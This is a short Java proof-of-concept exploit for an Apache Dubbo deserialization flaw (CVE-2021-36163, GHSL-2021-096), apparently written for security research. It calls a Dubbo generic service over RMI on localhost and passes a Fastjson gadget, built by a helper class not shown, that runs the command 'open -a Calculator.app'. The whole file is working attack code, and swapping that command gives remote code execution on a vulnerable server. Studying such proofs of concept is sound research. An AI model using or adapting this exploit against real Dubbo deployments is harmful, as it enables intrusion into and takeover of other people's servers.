package org.apache.dubbo.samples.http;

import org.apache.dubbo.rpc.service.GenericService;
import org.springframework.context.annotation.AnnotationConfigApplicationContext;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.remoting.rmi.RmiProxyFactoryBean;

/**
 * @author Whoopsunix
 *
 * CVE-2021-36163
 * GHSL-2021-096 https://securitylab.github.com/advisories/GHSL-2021-094-096-apache-dubbo/
 */
@Configuration
public class RMIAttack {
    @Bean
    RmiProxyFactoryBean service() {
        RmiProxyFactoryBean rmiProxyFactory = new RmiProxyFactoryBean();
        rmiProxyFactory.setServiceUrl("rmi://localhost:10999/org.apache.dubbo.samples.http.api.DemoService/generic");
        rmiProxyFactory.setServiceInterface(GenericService.class);
        return rmiProxyFactory;
    }

    public static void main(String args[]) throws Exception {
        AnnotationConfigApplicationContext context = new AnnotationConfigApplicationContext(RMIAttack.class);
        GenericService service = context.getBean(GenericService.class);
        Object res = service.$invoke("foo", new String[]{""}, new Object[]{GadgetBuilder.fastjson("open -a Calculator.app")});
        System.out.println(res);
    }
}
